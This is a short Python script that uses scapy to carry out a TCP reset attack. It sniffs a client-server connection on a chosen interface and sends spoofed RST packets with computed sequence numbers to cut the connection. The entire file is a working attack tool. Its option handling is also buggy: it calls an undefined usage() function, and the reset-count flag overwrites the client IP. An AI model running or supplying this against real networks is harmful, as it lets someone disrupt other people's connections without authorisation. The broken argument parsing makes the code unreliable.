#!/usr/bin/env python3
import getopt
import sys
from scapy.all import *


# giving usage information
def reset_usage(exit_num=None):
    usg = "Run a TCP reset attack. Disconnects client from server by spoofing\n"
    usg += "a reset packet from the client to the server. This will cause the\n"
    usg += "server to drop packets from the client\n\n"
    usg += "Requires: Server/Client IP, Interface"
    print(usg)


# run attack
def tcp_reset(client_ip, server_ip, intface, tcp_rst_count=5):
    fin_found = False

    while not fin_found:
        # capturing a packet with the source and destination provided
        pack = sniff(iface=intface, count=1, lfilter=lambda x:
                     x.haslayer(TCP) and
                     x.haslayer(Raw) and
                     x[IP].src == client_ip and
                     x[IP].dst == server_ip and
                     len(x[TCP].payload) > 0)[0]

        # calculating sequence numbers
        max_seq = pack[TCP].seq + tcp_rst_count * pack[TCP].window
        seqs = range(pack[TCP].seq, max_seq, len(pack[TCP].payload))[1:]

        # generating spoofed packets
        p = IP(src=client_ip, dst=server_ip) / \
            TCP(sport=pack[TCP].sport, dport=pack[TCP].dport, flags="R")

        # sending spoofed packets with calculated seq num
        for seq in seqs:
            p.seq = seq
            send(p, verbose=0)

        fin_found = True


# parsing in options
def main():
    tcp_rst_count = None
    client_ip = None
    server_ip = None
    intface = None

    try:
        opts, args = getopt.getopt(
            sys.argv[1:],
            "hc:s:i:r",
            ["help", "client", "server", "interface", "reset_count"]
        )

    except getopt.GetoptError as err:
        print("ERROR: {}\n".format(err))
        usage(2)

    for o, a in opts:
        if o in ("-s", "--server"):
            server_ip = a
        elif o in ("-c", "--client"):
            client_ip = a
        elif o in ("-r", "--reset_count"):
            client_ip = int(a)
        elif o in ("-i", "--interface"):
            intface = a
        elif o in ("-h", "--help"):
            usage()
        else:
            assert False, "unhandled option"

    if not client_ip or not server_ip or not intface:
        print("ERROR: Server, Client and Interface are required\n")
        usage(1)

    if not tcp_rst_count:
        tcp_rst_count = 5

    tcp_reset(client_ip, server_ip, intface, tcp_rst_count)

# main call
if __name__ == "__main__":
    main()
